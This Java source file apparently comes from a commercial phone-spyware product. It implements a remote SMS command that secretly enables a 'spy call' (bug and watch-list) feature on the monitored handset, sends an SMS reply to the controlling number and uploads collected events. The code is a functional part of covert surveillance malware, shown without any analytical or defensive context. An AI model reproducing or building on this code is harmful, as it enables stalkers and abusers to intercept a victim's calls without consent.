package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSEnableSpyCall extends RmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSEnableSpyCall(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getEnableSpyCallCmd());
		try {	
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			bugInfo.setEnabled(true);
			//bugInfo.setWatchAllEnabled(true);
			watchListInfo.setWatchListEnabled(true);			
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			if (rmtCmdLine.getEnabled() == DISABLE) {
				bugInfo.setEnabled(false);
				//bugInfo.setWatchAllEnabled(false);
				watchListInfo.setWatchListEnabled(false);
				responseMessage.append(RmtCmdTextResource.SPYCALL_DISABLED);
			} else {
				responseMessage.append(RmtCmdTextResource.SPYCALL_ENABLED);
			}
			bugInfo.setPrefWatchListInfo(watchListInfo);
			pref.commit(bugInfo);			
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdEnableSpyCall.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
